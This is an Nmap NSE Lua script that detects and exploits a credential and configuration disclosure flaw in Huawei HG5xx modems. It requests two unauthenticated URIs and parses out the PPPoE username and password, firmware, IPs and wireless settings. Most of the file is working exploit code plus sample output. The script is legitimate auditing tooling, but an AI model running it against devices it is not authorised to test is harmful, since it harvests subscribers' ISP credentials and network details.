description = [[
Detects Huawei modems models HG530x, HG520x, HG510x (and possibly others...)
vulnerable to a remote credential and information disclosure vulnerability. It
also extracts the PPPoE credentials and other interesting configuration values.

Attackers can query the URIs "/Listadeparametros.html" and "/wanfun.js" to
extract sensitive information including PPPoE credentials, firmware version,
model, gateway, dns servers and active connections among other values.

This script exploits two vulnerabilities. One was discovered and reported by
Adiaz from Comunidad Underground de Mexico (http://underground.org.mx) and it
allows attackers to extract the pppoe password. The configuration disclosure
vulnerability was discovered by Pedro Joaquin (http://hakim.ws).

References:
* http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
* http://routerpwn.com/#huawei
]]

---
-- @usage nmap -p80 --script http-huawei-hg5xx-vuln <target>
-- @usage nmap -sV http-huawei-hg5xx-vuln <target>
--
-- @output
-- PORT   STATE SERVICE VERSION
-- 80/tcp open  http    Huawei aDSL modem EchoLife HG530 (V100R001B122gTelmex) 4.07 -- UPnP/1.0 (ZyXEL ZyWALL 2)
-- | http-huawei-hg5xx-vuln:
-- |   VULNERABLE:
-- |   Remote credential and information disclosure in modems Huawei HG5XX
-- |     State: VULNERABLE (Exploitable)
-- |     Description:
-- |       Modems Huawei 530x, 520x and possibly others are vulnerable to remote credential and information disclosure.
-- |       Attackers can query the URIs "/Listadeparametros.html" and "/wanfun.js" to extract sensitive information
-- |       including PPPoE credentials, firmware version, model, gateway, dns servers and active connections among other values
-- |     Disclosure date: 2011-01-1
-- |     Extra information:
-- |
-- |   Model:EchoLife HG530
-- |   Firmware version:V100R001B122gTelmex
-- |   External IP:xxx.xxx.xx.xxx
-- |   Gateway IP:xxx.xx.xxx.xxx
-- |   DNS 1:200.33.146.249
-- |   DNS 2:200.33.146.241
-- |   Network segment:192.168.1.0
-- |   Active ethernet connections:0
-- |   Active wireless connections:3
-- |   BSSID:0xdeadbeefcafe
-- |   Wireless Encryption (Boolean):1
-- |   PPPoE username:xxx
-- |   PPPoE password:xxx
-- |     References:
-- |       http://routerpwn.com/#huawei
-- |_      http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = 'Remote credential and information disclosure in modems Huawei HG5XX',
    state = vulns.STATE.NOT_VULN,
    description = [[
Modems Huawei 530x, 520x and possibly others are vulnerable to remote credential and information disclosure.
Attackers can query the URIs "/Listadeparametros.html" and "/wanfun.js" to extract sensitive information
including PPPoE credentials, firmware version, model, gateway, dns servers and active connections among other values.]],
    references = {
      'http://routerpwn.com/#huawei',
      'http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure'
    },
    dates = {
      disclosure = {year = '2011', month = '01', day = '1'},
    },
  }

  -- Identify servers that answer 200 to invalid HTTP requests and exit as these would invalidate the tests
  local status_404, result_404, _ = http.identify_404(host,port)
  if ( status_404 and result_404 == 200 ) then
    stdnse.debug1("Exiting due to ambiguous response from web server on %s:%s. All URIs return status 200.", host.ip, port.number)
    return nil
  end

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local open_session = http.get(host.ip, port, "/Listadeparametros.html")
  if open_session and open_session.status == 200 then
    local _, _, pppoe_user = string.find(open_session.body, 'Usuario PPPoE:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, model = string.find(open_session.body, 'Modelo de m\195\179dem:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, firmware_version = string.find(open_session.body, 'Versi\195\179n de Firmware:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, gateway = string.find(open_session.body, 'Puerta de Enlace de Internet:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, ip = string.find(open_session.body, 'IP de Internet del m\195\179dem:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, dns1 = string.find(open_session.body, 'DNS Primario:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, dns2 = string.find(open_session.body, 'DNS Secundario:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, network_segment = string.find(open_session.body, 'Segmento de Red Local:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, active_ethernet = string.find(open_session.body, 'Conexiones Ethernet Activas:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, active_wireless = string.find(open_session.body, 'Conexiones Inal\195\161mbricas Activas:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, ssid = string.find(open_session.body, 'Nombre de Red Inal\195\161mbrica %(SSID%):</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local _, _, encryption = string.find(open_session.body, 'Encriptaci\195\179n Activada %(0: No, 1:S\195\173%):</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
    local info = string.format("\nModel:%s\nFirmware version:%s\nExternal IP:%s\nGateway IP:%s\nDNS 1:%s\nDNS 2:%s\n"..
      "Network segment:%s\nActive ethernet connections:%s\nActive wireless connections:%s\nBSSID:%s\nWireless Encryption (Boolean):%s\nPPPoE username:%s\n",
      model, firmware_version, ip, gateway, dns1, dns2, network_segment, active_ethernet, active_wireless, ssid, encryption, pppoe_user)
    --Checks if the username string was extracted. If its null, the modem is not vulnerable and we should exit.
    if pppoe_user then
      vuln.state = vulns.STATE.EXPLOIT
    else
      stdnse.debug1("Username string was not found in this page. Exiting.")
      return vuln_report:make_output(vuln)
    end

    local ppp = http.get(host.ip, port, "/wanfun.js")
    if ppp.status and ppp.status == 200 then
      local _, _, ppp_pwd = string.find(ppp.body, 'var pwdppp = "(.-)"')
      info = string.format("%sPPPoE password:%s", info, ppp_pwd)
    end
    if firmware_version and model then
      port.version.product = string.format("Huawei aDSL modem %s (%s)", model, firmware_version)
      nmap.set_port_version(host, port)
    end
    vuln.extra_info = info
    return vuln_report:make_output(vuln)
  end
end
